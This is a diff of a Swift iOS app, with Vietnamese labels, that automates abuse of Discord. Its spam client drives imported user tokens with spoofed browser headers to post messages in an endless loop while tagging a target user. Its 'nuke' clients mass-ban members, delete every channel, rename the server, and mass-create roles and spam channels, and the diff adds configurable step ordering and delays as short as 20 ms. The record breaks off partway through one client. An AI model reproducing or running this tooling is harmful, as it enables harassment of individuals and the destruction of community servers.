@@ -1,5 +1,6 @@
 import SwiftUI
 import Foundation
+import Security
 import AVFoundation
 import UniformTypeIdentifiers
 import UIKit
@@ -11,28 +12,20 @@ struct DocumentPicker: UIViewControllerRepresentable {
     let contentTypes: [UTType]
     let onPick: (URL) -> Void
     let onCancel: (() -> Void)?
-
-    init(contentTypes: [UTType] = [.item],
-         onPick: @escaping (URL) -> Void,
-         onCancel: (() -> Void)? = nil) {
-        self.contentTypes = contentTypes
-        self.onPick = onPick
-        self.onCancel = onCancel
+    init(contentTypes: [UTType] = [.item], onPick: @escaping (URL) -> Void, onCancel: (() -> Void)? = nil) {
+        self.contentTypes = contentTypes; self.onPick = onPick; self.onCancel = onCancel
     }
     func makeCoordinator() -> Coordinator { Coordinator(self) }
     func makeUIViewController(context: Context) -> UIDocumentPickerViewController {
         let p = UIDocumentPickerViewController(forOpeningContentTypes: contentTypes, asCopy: true)
-        p.allowsMultipleSelection = false
-        p.delegate = context.coordinator
-        return p
+        p.allowsMultipleSelection = false; p.delegate = context.coordinator; return p
     }
     func updateUIViewController(_ vc: UIDocumentPickerViewController, context: Context) {}
     final class Coordinator: NSObject, UIDocumentPickerDelegate {
         let parent: DocumentPicker
-        init(_ p: DocumentPicker) { self.parent = p }
+        init(_ p: DocumentPicker) { parent = p }
         func documentPicker(_ c: UIDocumentPickerViewController, didPickDocumentsAt urls: [URL]) {
-            guard let u = urls.first else { return }
-            parent.onPick(u)
+            if let u = urls.first { parent.onPick(u) }
         }
         func documentPickerWasCancelled(_ c: UIDocumentPickerViewController) { parent.onCancel?() }
     }
@@ -41,10 +34,7 @@ struct DocumentPicker: UIViewControllerRepresentable {
 // ==========================================
 // MARK: - MODELS
 // ==========================================
-struct DiscordUser: Codable {
-    let id, username: String
-    let globalName, avatar: String?
-}
+struct DiscordUser: Codable { let id, username: String; let globalName: String?; let avatar: String? }
 
 struct TokenInfo: Identifiable, Codable, Equatable {
     var id = UUID()
@@ -52,35 +42,22 @@ struct TokenInfo: Identifiable, Codable, Equatable {
     var userId, username: String
     var avatarHash: String?
     var isValid: Bool
-
     var avatarURL: URL? {
         guard let h = avatarHash else { return nil }
         return URL(string: "https://cdn.discordapp.com/avatars/\(userId)/\(h).png?size=128")
     }
-    var initial: String { String(username.prefix(1)).uppercased() }
 }
 
 struct Guild: Codable, Identifiable, Hashable { let id, name: String; let icon: String? }
-
 struct Channel: Codable, Identifiable, Hashable {
-    let id: String
-    let name: String?
-    let type: Int
-    let position: Int?
-    let parentId: String?
+    let id: String; let name: String?; let type: Int; let position: Int?; let parentId: String?
     var isSendableText: Bool { type == 0 || type == 5 }
     var isCategory: Bool { type == 4 }
     var displayName: String { name ?? "không tên" }
 }
-
 struct ParsedMessage: Identifiable, Hashable { let id = UUID(); let body: String }
 
-struct BotInfo: Codable {
-    let id, username: String
-    let discriminator, avatar: String?
-    let bot: Bool?
-}
-
+struct BotInfo: Codable { let id, username: String; let discriminator, avatar: String?; let bot: Bool? }
 struct BotConfig: Codable {
     var token, username, userId: String
     var avatarHash, discriminator: String?
@@ -92,7 +69,6 @@ struct BotConfig: Codable {
         guard let h = avatarHash else { return nil }
         return URL(string: "https://cdn.discordapp.com/avatars/\(userId)/\(h).png?size=128")
     }
-    var initial: String { String(username.prefix(1)).uppercased() }
 }
 
 struct GuildRole: Codable { let id, name: String; let position: Int }
@@ -110,15 +86,45 @@ struct NukeGuild: Codable {
     var canManageGuild: Bool { bits & (1 << 5) != 0 }
     var canManageChannels: Bool { bits & (1 << 4) != 0 }
     var canBan: Bool { bits & (1 << 2) != 0 }
-    var canNuke: Bool { isOwner || isAdmin || (canManageGuild && canManageChannels && canBan) }
+    var canManageRoles: Bool { bits & (1 << 28) != 0 }
+    var canNuke: Bool {
+        if isOwner || isAdmin { return true }
+        return canManageGuild && canManageChannels && canBan
+    }
+}
+
+// Nuke step types
+enum NukeStepType: String, CaseIterable, Identifiable {
+    case massBan = "Mass Ban"
+    case deleteChannels = "Xóa kênh"
+    case renameGuild = "Đổi tên server"
+    case createRoles = "Tạo Role"
+    case createChannels = "Tạo kênh + Spam"
+    var id: String { rawValue }
+    var icon: String {
+        switch self {
+        case .massBan: return "hammer.fill"
+        case .deleteChannels: return "trash.fill"
+        case .renameGuild: return "pencil"
+        case .createRoles: return "star.fill"
+        case .createChannels: return "plus.rectangle.on.rectangle"
+        }
+    }
 }
 
 struct NukeConfig {
-    var doMassBan = false
-    var doDeleteChannels = false
-    var doCreateRoles = false
-    var doCreateChannels = true
-    var doRenameGuild = false
+    // Order + enable
+    var enabledSteps: Set<NukeStepType> = [.createChannels]
+    var stepOrder: [NukeStepType] = NukeStepType.allCases
+
+    // Per-function delay (seconds between ops)
+    var banDelay: Double = 0.02
+    var deleteDelay: Double = 0.05
+    var createChDelay: Double = 0.10
+    var createRoleDelay: Double = 0.10
+    var msgDelay: Double = 0.10
+
+    // Config
     var banRoleId = ""
     var roleName = "Ceker Cute"
     var roleCount = 50
@@ -130,7 +136,7 @@ struct NukeConfig {
 }
 
 // ==========================================
-// MARK: - BACKGROUND MANAGER
+// MARK: - BACKGROUND
 // ==========================================
 class BackgroundManager {
     static let shared = BackgroundManager()
@@ -142,22 +148,20 @@ class BackgroundManager {
             try AVAudioSession.sharedInstance().setCategory(.playback, mode: .default, options: [.mixWithOthers])
             try AVAudioSession.sharedInstance().setActive(true)
             let sr = 8000, ds = sr * 2
-            var h = Data()
-            h.append(contentsOf: [0x52,0x49,0x46,0x46])
+            var h = Data(); h.append(contentsOf: [0x52,0x49,0x46,0x46])
             var cs = UInt32(36 + ds).littleEndian; h.append(Data(bytes: &cs, count: 4))
             h.append(contentsOf: [0x57,0x41,0x56,0x45,0x66,0x6d,0x74,0x20])
-            var sc1 = UInt32(16).littleEndian; h.append(Data(bytes: &sc1, count: 4))
+            var s1 = UInt32(16).littleEndian; h.append(Data(bytes: &s1, count: 4))
             var af = UInt16(1).littleEndian; h.append(Data(bytes: &af, count: 2))
             var nc = UInt16(1).littleEndian; h.append(Data(bytes: &nc, count: 2))
-            var srl = UInt32(sr).littleEndian; h.append(Data(bytes: &srl, count: 4))
-            var br = UInt32(sr * 2).littleEndian; h.append(Data(bytes: &br, count: 4))
+            var sl = UInt32(sr).littleEndian; h.append(Data(bytes: &sl, count: 4))
+            var br = UInt32(sr*2).littleEndian; h.append(Data(bytes: &br, count: 4))
             var ba = UInt16(2).littleEndian; h.append(Data(bytes: &ba, count: 2))
-            var bps = UInt16(16).littleEndian; h.append(Data(bytes: &bps, count: 2))
+            var bp = UInt16(16).littleEndian; h.append(Data(bytes: &bp, count: 2))
             h.append(contentsOf: [0x64,0x61,0x74,0x61])
-            var dcs = UInt32(ds).littleEndian; h.append(Data(bytes: &dcs, count: 4))
+            var dc = UInt32(ds).littleEndian; h.append(Data(bytes: &dc, count: 4))
             audioPlayer = try AVAudioPlayer(data: h + Data(repeating: 0, count: ds))
-            audioPlayer?.numberOfLoops = -1
-            audioPlayer?.play()
+            audioPlayer?.numberOfLoops = -1; audioPlayer?.play()
         } catch {}
     }
     func stop() {
@@ -170,24 +174,23 @@ class BackgroundManager {
 // MARK: - DISCORD CLIENT (SPAM)
 // ==========================================
 class DiscordClient {
-    let token: String
-    let session: URLSession
+    let token: String; let session: URLSession
     init(token: String) {
         self.token = token
         let cfg = URLSessionConfiguration.default
         let sp = """
-        {"os":"Mac OS X","browser":"Chrome","device":"","system_locale":"en-US","browser_user_agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36","browser_version":"126.0.0.0","os_version":"10.15.7","referrer":"","referring_domain":"","referrer_current":"","referring_domain_current":"","release_channel":"stable","client_build_number":305000,"client_event_source":null}
+        {"os":"Mac OS X","browser":"Chrome","device":"","system_locale":"en-US","browser_user_agent":"Mozilla/5.0","browser_version":"126.0.0.0","os_version":"10.15.7","referrer":"","referring_domain":"","referrer_current":"","referring_domain_current":"","release_channel":"stable","client_build_number":305000,"client_event_source":null}
         """
         cfg.httpAdditionalHeaders = [
             "Authorization": token, "Content-Type": "application/json",
-            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
+            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
             "X-Super-Properties": Data(sp.utf8).base64EncodedString(), "X-Discord-Locale": "en-US"
         ]
-        self.session = URLSession(configuration: cfg)
+        session = URLSession(configuration: cfg)
     }
     private func check(_ res: URLResponse, _ data: Data) throws {
         guard let h = res as? HTTPURLResponse, (200...299).contains(h.statusCode) else {
-            throw NSError(domain: "D", code: (res as? HTTPURLResponse)?.statusCode ?? 0,
+            throw NSError(domain: "Discord", code: (res as? HTTPURLResponse)?.statusCode ?? 0,
                           userInfo: [NSLocalizedDescriptionKey: String(data: data, encoding: .utf8) ?? ""])
         }
     }
@@ -208,9 +211,9 @@ class DiscordClient {
         req.httpMethod = "POST"
         req.httpBody = try JSONSerialization.data(withJSONObject: ["content": content])
         let (d, r) = try await session.data(for: req)
-        if let http = r as? HTTPURLResponse, http.statusCode == 429,
-           let json = try? JSONSerialization.jsonObject(with: d) as? [String: Any],
-           let retry = json["retry_after"] as? Double {
+        if let h = r as? HTTPURLResponse, h.statusCode == 429,
+           let j = try? JSONSerialization.jsonObject(with: d) as? [String: Any],
+           let retry = j["retry_after"] as? Double {
             try await Task.sleep(nanoseconds: UInt64((retry + 0.5) * 1_000_000_000))
             return try await sendMessage(channelId: channelId, content: content)
         }
@@ -219,7 +222,7 @@ class DiscordClient {
 }
 
 // ==========================================
-// MARK: - APP STATE (SPAM) — storage key: "SpamTokensV2"
+// MARK: - APP STATE
 // ==========================================
 @MainActor
 class AppState: ObservableObject {
@@ -230,7 +233,7 @@ class AppState: ObservableObject {
     @Published var channels: [Channel] = []
     @Published var isLoading = false
     @Published var delaySeconds: Double = 2.0
-    @Published var useTag: Bool = true
+    @Published var useTag = true
     @Published var targetUserId = ""
     @Published var addPrefix = false
     @Published var addSuffix = false
@@ -241,45 +244,33 @@ class AppState: ObservableObject {
     @Published var currentMessageStr = ""
     @Published var lastError: String?
 
-    private let storageKey = "SpamTokensV2"
     private var client: DiscordClient? { activeToken.map { DiscordClient(token: $0.token) } }
     private var isCancelled = false
     private var sendTask: Task<Void, Never>?
 
-    init() { migrateIfNeeded(); loadTokens() }
-
-    private func migrateIfNeeded() {
-        if UserDefaults.standard.data(forKey: storageKey) == nil,
-           let old = UserDefaults.standard.data(forKey: "SavedTokens") {
-            UserDefaults.standard.set(old, forKey: storageKey)
-        }
-    }
+    init() { loadTokens() }
     private func saveTokens() {
-        if let e = try? JSONEncoder().encode(tokens) { UserDefaults.standard.set(e, forKey: storageKey) }
+        if let e = try? JSONEncoder().encode(tokens) { UserDefaults.standard.set(e, forKey: "SavedTokens") }
     }
     private func loadTokens() {
-        if let d = UserDefaults.standard.data(forKey: storageKey),
+        if let d = UserDefaults.standard.data(forKey: "SavedTokens"),
            let s = try? JSONDecoder().decode([TokenInfo].self, from: d) {
-            self.tokens = s
+            tokens = s
             if let a = s.first(where: { $0.isValid }) {
-                self.activeToken = a
-                Task { await loadGuilds() }
+                activeToken = a; Task { await loadGuilds() }
             }
         }
     }
-
     func addToken(_ s: String) async {
-        let clean = s.trimmingCharacters(in: .whitespacesAndNewlines)
-        guard !clean.isEmpty, !tokens.contains(where: { $0.token == clean }) else { return }
+        let c = s.trimmingCharacters(in: .whitespacesAndNewlines)
+        guard !c.isEmpty, !tokens.contains(where: { $0.token == c }) else { return }
         isCheckingToken = true
         do {
-            let u = try await DiscordClient(token: clean).validateToken()
-            let t = TokenInfo(token: clean, userId: u.id, username: u.globalName ?? u.username,
-                              avatarHash: u.avatar, isValid: true)
-            tokens.append(t)
-            if activeToken == nil { setActiveToken(t) }
+            let u = try await DiscordClient(token: c).validateToken()
+            let t = TokenInfo(token: c, userId: u.id, username: u.globalName ?? u.username, avatarHash: u.avatar, isValid: true)
+            tokens.append(t); if activeToken == nil { setActiveToken(t) }
         } catch {
-            tokens.append(TokenInfo(token: clean, userId: "0", username: "Token chết", avatarHash: nil, isValid: false))
+            tokens.append(TokenInfo(token: c, userId: "0", username: "Token chết", avatarHash: nil, isValid: false))
         }
         isCheckingToken = false
     }
@@ -288,11 +279,10 @@ class AppState: ObservableObject {
         defer { if got { url.stopAccessingSecurityScopedResource() } }
         try? FileManager.default.startDownloadingUbiquitousItem(at: url)
         var data: Data?
-        let coord = NSFileCoordinator()
-        var err: NSError?
-        coord.coordinate(readingItemAt: url, options: [], error: &err) { u in data = try? Data(contentsOf: u) }
+        let co = NSFileCoordinator(); var err: NSError?
+        co.coordinate(readingItemAt: url, options: [], error: &err) { u in data = try? Data(contentsOf: u) }
         if data == nil { data = try? Data(contentsOf: url) }
-        guard let d = data else { lastError = "Không đọc được file"; return }
+        guard let d = data else { lastError = "Không đọc file"; return }
         var text: String?
         for enc in [String.Encoding.utf8, .utf16, .utf16LittleEndian, .utf16BigEndian, .windowsCP1252, .isoLatin1, .ascii] {
             if let s = String(data: d, encoding: enc), !s.isEmpty { text = s; break }
@@ -300,21 +290,15 @@ class AppState: ObservableObject {
         if text == nil { text = String(decoding: d, as: UTF8.self) }
         guard let t = text else { lastError = "File rỗng"; return }
         let clean = t.replacingOccurrences(of: "\u{FEFF}", with: "")
-        for line in clean.components(separatedBy: .newlines) where !line.trimmingCharacters(in: .whitespacesAndNewlines).isEmpty {
-            await addToken(line)
+        for l in clean.components(separatedBy: .newlines) where !l.trimmingCharacters(in: .whitespacesAndNewlines).isEmpty {
+            await addToken(l)
         }
         lastError = nil
     }
-    func setActiveToken(_ t: TokenInfo) {
-        guard t.isValid else { return }
-        activeToken = t
-        Task { await loadGuilds() }
-    }
-    func deleteToken(at offsets: IndexSet) {
-        if let a = activeToken, offsets.map({ tokens[$0] }).contains(where: { $0.id == a.id }) {
-            activeToken = nil; guilds = []
-        }
-        tokens.remove(atOffsets: offsets)
+    func setActiveToken(_ t: TokenInfo) { guard t.isValid else { return }; activeToken = t; Task { await loadGuilds() } }
+    func deleteToken(at off: IndexSet) {
+        if let a = activeToken, off.map({ tokens[$0] }).contains(where: { $0.id == a.id }) { activeToken = nil; guilds = [] }
+        tokens.remove(atOffsets: off)
     }
     func loadGuilds() async {
         guard let c = client else { return }
@@ -333,34 +317,34 @@ class AppState: ObservableObject {
         isLoading = false
     }
     func groupedChannels() -> [(category: Channel?, items: [Channel])] {
-        var secs: [(Channel?, [Channel])] = []
-        let orp = channels.filter { $0.isSendableText && $0.parentId == nil }
-        if !orp.isEmpty { secs.append((nil, orp)) }
-        for cat in channels where cat.isCategory {
-            let kids = channels.filter { $0.isSendableText && $0.parentId == cat.id }
-            if !kids.isEmpty { secs.append((cat, kids)) }
+        var r: [(Channel?, [Channel])] = []
+        let o = channels.filter { $0.isSendableText && $0.parentId == nil }
+        if !o.isEmpty { r.append((nil, o)) }
+        for c in channels where c.isCategory {
+            let k = channels.filter { $0.isSendableText && $0.parentId == c.id }
+            if !k.isEmpty { r.append((c, k)) }
         }
-        return secs
+        return r
     }
     func parseFile(url: URL) {
         let got = url.startAccessingSecurityScopedResource()
         defer { if got { url.stopAccessingSecurityScopedResource() } }
         try? FileManager.default.startDownloadingUbiquitousItem(at: url)
-        var data: Data?
-        let coord = NSFileCoordinator()
-        var err: NSError?
-        coord.coordinate(readingItemAt: url, options: [], error: &err) { u in data = try? Data(contentsOf: u) }
-        if data == nil { data = try? Data(contentsOf: url) }
-        guard let d = data else { lastError = "Không đọc file"; return }
-        var content: String?
-        for enc in [String.Encoding.utf8, .utf16, .utf16LittleEndian, .utf16BigEndian, .windowsCP1252, .isoLatin1, .ascii, .nonLossyASCII] {
-            if let s = String(data: d, encoding: enc), !s.isEmpty { content = s; break }
+        var data: Data?; var err: String?
+        let co = NSFileCoordinator(); var ce: NSError?
+        co.coordinate(readingItemAt: url, options: [], error: &ce) { u in
+            do { data = try Data(contentsOf: u) } catch { err = error.localizedDescription }
         }
-        if content == nil || content!.isEmpty { content = String(decoding: d, as: UTF8.self) }
-        guard let fc = content, !fc.isEmpty else { lastError = "File rỗng"; return }
+        if data == nil { do { data = try Data(contentsOf: url) } catch { err = error.localizedDescription } }
+        guard let d = data else { lastError = "Không đọc file: \(err ?? "")"; return }
+        var c: String?
+        for enc in [String.Encoding.utf8, .utf16, .utf16LittleEndian, .utf16BigEndian, .windowsCP1252, .isoLatin1, .ascii, .nonLossyASCII] {
+            if let s = String(data: d, encoding: enc), !s.isEmpty { c = s; break }
+        }
+        if c == nil || c!.isEmpty { c = String(decoding: d, as: UTF8.self) }
+        guard let fc = c, !fc.isEmpty else { lastError = "File rỗng"; return }
         inputText = fc.replacingOccurrences(of: "\u{FEFF}", with: "")
-        parseDirectInput()
-        lastError = nil
+        parseDirectInput(); lastError = nil
     }
     func parseDirectInput() {
         messages = inputText.components(separatedBy: .newlines).compactMap {
@@ -377,51 +361,43 @@ class AppState: ObservableObject {
             guard let self = self else { return }
             var i = 0
             while !self.isCancelled && !Task.isCancelled {
-                let msg = self.messages[i]
-                var pre = ""
-                if self.addPrefix { pre += "> " }
-                if self.addSuffix { pre += "# " }
-                var fc = pre + msg.body
+                let m = self.messages[i]
+                var p = ""
+                if self.addPrefix { p += "> " }
+                if self.addSuffix { p += "# " }
+                var fc = p + m.body
                 if self.useTag { fc += " <@\(self.targetUserId)>" }
                 self.currentMessageStr = fc
                 do { try await c.sendMessage(channelId: channel.id, content: fc); self.totalSent += 1 }
                 catch { self.lastError = error.localizedDescription }
                 i = (i + 1) % self.messages.count
-                let delay = max(0.1, self.delaySeconds + Double.random(in: -0.3...0.3) * self.delaySeconds)
-                do { try await Task.sleep(nanoseconds: UInt64(delay * 1_000_000_000)) } catch { break }
+                let d = max(0.1, self.delaySeconds + Double.random(in: -0.3...0.3) * self.delaySeconds)
+                do { try await Task.sleep(nanoseconds: UInt64(d * 1_000_000_000)) } catch { break }
             }
             self.isSending = false; self.currentMessageStr = ""
         }
     }
-    func stopSending() {
-        isCancelled = true; sendTask?.cancel(); sendTask = nil; isSending = false
-        BackgroundManager.shared.stop()
-    }
-    func hideKeyboard() {
-        UIApplication.shared.sendAction(#selector(UIResponder.resignFirstResponder), to: nil, from: nil, for: nil)
-    }
+    func stopSending() { isCancelled = true; sendTask?.cancel(); sendTask = nil; isSending = false; BackgroundManager.shared.stop() }
+    func hideKeyboard() { UIApplication.shared.sendAction(#selector(UIResponder.resignFirstResponder), to: nil, from: nil, for: nil) }
 }
 
 // ==========================================
 // MARK: - BOT CLIENT
 // ==========================================
 class BotClient {
-    let auth: String
-    let session: URLSession
+    let auth: String; let session: URLSession
     static let EVERYONE_ALLOW: UInt64 = (1<<10)|(1<<11)|(1<<16)|(1<<15)|(1<<14)|(1<<6)|(1<<17)
     init(token: String) {
-        let clean = token.trimmingCharacters(in: .whitespacesAndNewlines)
-        self.auth = clean.lowercased().hasPrefix("bot ") ? clean : "Bot \(clean)"
+        let c = token.trimmingCharacters(in: .whitespacesAndNewlines)
+        auth = c.lowercased().hasPrefix("bot ") ? c : "Bot \(c)"
         let cfg = URLSessionConfiguration.default
         cfg.timeoutIntervalForRequest = 30
         cfg.httpAdditionalHeaders = ["Authorization": auth, "Content-Type": "application/json",
                                      "User-Agent": "DiscordBot (https://example.com, 1.0)"]
-        self.session = URLSession(configuration: cfg)
+        session = URLSession(configuration: cfg)
     }
     private func check(_ res: URLResponse, _ data: Data) throws {
-        guard let h = res as? HTTPURLResponse else {
-            throw NSError(domain: "B", code: -1, userInfo: [NSLocalizedDescriptionKey: "No HTTP"])
-        }
+        guard let h = res as? HTTPURLResponse else { throw NSError(domain: "B", code: -1, userInfo: [NSLocalizedDescriptionKey: "No HTTP"]) }
         guard (200...299).contains(h.statusCode) else {
             throw NSError(domain: "B", code: h.statusCode, userInfo: [NSLocalizedDescriptionKey:
                 "HTTP \(h.statusCode): \(String(data: data, encoding: .utf8)?.prefix(200) ?? "")"])
@@ -435,83 +411,73 @@ class BotClient {
         let (d, r) = try await session.data(from: URL(string: "https://discord.com/api/v10/users/@me/guilds")!)
         try check(r, d); return try JSONDecoder().decode([Guild].self, from: d)
     }
-    func getGuildDetail(_ gid: String) async throws -> [String: Any] {
-        let (d, r) = try await session.data(from: URL(string: "https://discord.com/api/v10/guilds/\(gid)")!)
-        try check(r, d)
-        return (try JSONSerialization.jsonObject(with: d) as? [String: Any]) ?? [:]
+    func getGuildDetail(_ g: String) async throws -> [String: Any] {
+        let (d, r) = try await session.data(from: URL(string: "https://discord.com/api/v10/guilds/\(g)")!)
+        try check(r, d); return (try JSONSerialization.jsonObject(with: d) as? [String: Any]) ?? [:]
     }
-    func getRoles(_ gid: String) async throws -> [GuildRole] {
-        let (d, r) = try await session.data(from: URL(string: "https://discord.com/api/v10/guilds/\(gid)/roles")!)
+    func getRoles(_ g: String) async throws -> [GuildRole] {
+        let (d, r) = try await session.data(from: URL(string: "https://discord.com/api/v10/guilds/\(g)/roles")!)
         try check(r, d); return try JSONDecoder().decode([GuildRole].self, from: d)
     }
-    func getMember(_ gid: String, userId: String) async throws -> BotMember {
-        let (d, r) = try await session.data(from: URL(string: "https://discord.com/api/v10/guilds/\(gid)/members/\(userId)")!)
+    func getMember(_ g: String, userId: String) async throws -> BotMember {
+        let (d, r) = try await session.data(from: URL(string: "https://discord.com/api/v10/guilds/\(g)/members/\(userId)")!)
         try check(r, d); return try JSONDecoder().decode(BotMember.self, from: d)
     }
-    func getMembers(_ gid: String, after: String = "0") async throws -> [BotMember] {
-        let (d, r) = try await session.data(from: URL(string: "https://discord.com/api/v10/guilds/\(gid)/members?limit=1000&after=\(after)")!)
+    func getMembers(_ g: String, after: String = "0") async throws -> [BotMember] {
+        let (d, r) = try await session.data(from: URL(string: "https://discord.com/api/v10/guilds/\(g)/members?limit=1000&after=\(after)")!)
         try check(r, d); return try JSONDecoder().decode([BotMember].self, from: d)
     }
-    func getChannels(_ gid: String) async throws -> [Channel] {
-        let (d, r) = try await session.data(from: URL(string: "https://discord.com/api/v10/guilds/\(gid)/channels")!)
+    func getChannels(_ g: String) async throws -> [Channel] {
+        let (d, r) = try await session.data(from: URL(string: "https://discord.com/api/v10/guilds/\(g)/channels")!)
         try check(r, d); return try JSONDecoder().decode([Channel].self, from: d)
     }
-    func deleteChannel(_ cid: String) async throws {
-        var req = URLRequest(url: URL(string: "https://discord.com/api/v10/channels/\(cid)")!)
+    func deleteChannel(_ c: String) async throws {
+        var req = URLRequest(url: URL(string: "https://discord.com/api/v10/channels/\(c)")!)
         req.httpMethod = "DELETE"
         let (d, r) = try await session.data(for: req); try check(r, d)
     }
-    func createChannel(_ gid: String, name: String, openEveryone: Bool) async throws -> String? {
-        var req = URLRequest(url: URL(string: "https://discord.com/api/v10/guilds/\(gid)/channels")!)
+    func createChannel(_ g: String, name: String, openEveryone: Bool) async throws -> String? {
+        var req = URLRequest(url: URL(string: "https://discord.com/api/v10/guilds/\(g)/channels")!)
         req.httpMethod = "POST"
         var p: [String: Any] = ["name": name, "type": 0]
-        if openEveryone {
-            p["permission_overwrites"] = [["id": gid, "type": 0,
-                                           "allow": String(BotClient.EVERYONE_ALLOW), "deny": "0"]]
-        }
+        if openEveryone { p["permission_overwrites"] = [["id": g, "type": 0, "allow": String(BotClient.EVERYONE_ALLOW), "deny": "0"]] }
         req.httpBody = try JSONSerialization.data(withJSONObject: p)
         let (d, r) = try await session.data(for: req); try check(r, d)
         return (try? JSONSerialization.jsonObject(with: d) as? [String: Any])?["id"] as? String
     }
-    func sendMessage(_ cid: String, content: String) async throws {
-        var req = URLRequest(url: URL(string: "https://discord.com/api/v10/channels/\(cid)/messages")!)
-        req.httpMethod = "POST"
-        req.httpBody = try JSONSerialization.data(withJSONObject: ["content": content])
+    func sendMessage(_ c: String, content: String) async throws {
+        var req = URLRequest(url: URL(string: "https://discord.com/api/v10/channels/\(c)/messages")!)
+        req.httpMethod = "POST"; req.httpBody = try JSONSerialization.data(withJSONObject: ["content": content])
         let (d, r) = try await session.data(for: req); try check(r, d)
     }
-    func createRole(_ gid: String, name: String) async throws {
-        var req = URLRequest(url: URL(string: "https://discord.com/api/v10/guilds/\(gid)/roles")!)
-        req.httpMethod = "POST"
-        req.httpBody = try JSONSerialization.data(withJSONObject: ["name": name])
+    func createRole(_ g: String, name: String) async throws {
+        var req = URLRequest(url: URL(string: "https://discord.com/api/v10/guilds/\(g)/roles")!)
+        req.httpMethod = "POST"; req.httpBody = try JSONSerialization.data(withJSONObject: ["name": name])
         let (d, r) = try await session.data(for: req); try check(r, d)
     }
-    func renameGuild(_ gid: String, newName: String) async throws {
-        var req = URLRequest(url: URL(string: "https://discord.com/api/v10/guilds/\(gid)")!)
-        req.httpMethod = "PATCH"
-        req.httpBody = try JSONSerialization.data(withJSONObject: ["name": newName])
+    func renameGuild(_ g: String, newName: String) async throws {
+        var req = URLRequest(url: URL(string: "https://discord.com/api/v10/guilds/\(g)")!)
+        req.httpMethod = "PATCH"; req.httpBody = try JSONSerialization.data(withJSONObject: ["name": newName])
         let (d, r) = try await session.data(for: req); try check(r, d)
     }
-    func banMember(_ gid: String, userId: String) async throws {
-        var req = URLRequest(url: URL(string: "https://discord.com/api/v10/guilds/\(gid)/bans/\(userId)")!)
-        req.httpMethod = "PUT"
-        req.httpBody = try JSONSerialization.data(withJSONObject: ["delete_message_seconds": 0])
+    func banMember(_ g: String, userId: String) async throws {
+        var req = URLRequest(url: URL(string: "https://discord.com/api/v10/guilds/\(g)/bans/\(userId)")!)
+        req.httpMethod = "PUT"; req.httpBody = try JSONSerialization.data(withJSONObject: ["delete_message_seconds": 0])
         let (d, r) = try await session.data(for: req); try check(r, d)
     }
 }
 
 // ==========================================
-// MARK: - USER NUKE CLIENT
+// MARK: - USER NUKE CLIENT (WS)
 // ==========================================
 class UserNukeClient {
-    let token: String
-    let session: URLSession
+    let token: String; let session: URLSession
     static let EVERYONE_ALLOW: UInt64 = (1<<10)|(1<<11)|(1<<16)|(1<<15)|(1<<14)|(1<<6)|(1<<17)
     init(token: String) {
         self.token = token
-        let cfg = URLSessionConfiguration.default
-        cfg.timeoutIntervalForRequest = 30
+        let cfg = URLSessionConfiguration.default; cfg.timeoutIntervalForRequest = 30
         let sp = """
-        {"os":"iOS","browser":"Safari","device":"","system_locale":"en-US","browser_user_agent":"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15","browser_version":"17.0","os_version":"17.0","referrer":"","referring_domain":"","referrer_current":"","referring_domain_current":"","release_channel":"stable","client_build_number":305000,"client_event_source":null}
+        {"os":"iOS","browser":"Safari","device":"","system_locale":"en-US","browser_user_agent":"Mozilla/5.0 (iPhone)","browser_version":"17.0","os_version":"17.0","referrer":"","referring_domain":"","referrer_current":"","referring_domain_current":"","release_channel":"stable","client_build_number":305000,"client_event_source":null}
         """
         cfg.httpAdditionalHeaders = [
             "Authorization": token, "Content-Type": "application/json",
@@ -521,12 +487,10 @@ class UserNukeClient {
             "X-Context-Properties": "e30=", "Origin": "https://discord.com",
             "Referer": "https://discord.com/channels/@me"
         ]
-        self.session = URLSession(configuration: cfg)
+        session = URLSession(configuration: cfg)
     }
     private func check(_ res: URLResponse, _ data: Data) throws {
-        guard let h = res as? HTTPURLResponse else {
-            throw NSError(domain: "UN", code: -1, userInfo: [NSLocalizedDescriptionKey: "No HTTP"])
-        }
+        guard let h = res as? HTTPURLResponse else { throw NSError(domain: "UN", code: -1, userInfo: [NSLocalizedDescriptionKey: "No HTTP"]) }
         guard (200...299).contains(h.statusCode) else {
             throw NSError(domain: "UN", code: h.statusCode, userInfo: [NSLocalizedDescriptionKey:
                 "HTTP \(h.statusCode): \(String(data: data, encoding: .utf8)?.prefix(200) ?? "")"])
@@ -540,86 +504,78 @@ class UserNukeClient {
         let (d, r) = try await session.data(from: URL(string: "https://discord.com/api/v10/users/@me/guilds")!)
         try check(r, d); return try JSONDecoder().decode([NukeGuild].self, from: d)
     }
-    func getGuildDetail(_ gid: String) async throws -> [String: Any] {
-        let (d, r) = try await session.data(from: URL(string: "https://discord.com/api/v10/guilds/\(gid)")!)
-        try check(r, d)
-        return (try JSONSerialization.jsonObject(with: d) as? [String: Any]) ?? [:]
+    func getGuildDetail(_ g: String) async throws -> [String: Any] {
+        let (d, r) = try await session.data(from: URL(string: "https://discord.com/api/v10/guilds/\(g)")!)
+        try check(r, d); return (try JSONSerialization.jsonObject(with: d) as? [String: Any]) ?? [:]
     }
-    func getRoles(_ gid: String) async throws -> [GuildRole] {
-        let (d, r) = try await session.data(from: URL(string: "https://discord.com/api/v10/guilds/\(gid)/roles")!)
+    func getRoles(_ g: String) async throws -> [GuildRole] {
+        let (d, r) = try await session.data(from: URL(string: "https://discord.com/api/v10/guilds/\(g)/roles")!)
         try check(r, d); return try JSONDecoder().decode([GuildRole].self, from: d)
     }
-    func getMember(_ gid: String, uid: String) async throws -> BotMember {
-        let (d, r) = try await session.data(from: URL(string: "https://discord.com/api/v10/guilds/\(gid)/members/\(uid)")!)
+    func getMember(_ g: String, uid: String) async throws -> BotMember {
+        let (d, r) = try await session.data(from: URL(string: "https://discord.com/api/v10/guilds/\(g)/members/\(uid)")!)
         try check(r, d); return try JSONDecoder().decode(BotMember.self, from: d)
     }
-    func getChannels(_ gid: String) async throws -> [Channel] {
-        let (d, r) = try await session.data(from: URL(string: "https://discord.com/api/v10/guilds/\(gid)/channels")!)
+    func getChannels(_ g: String) async throws -> [Channel] {
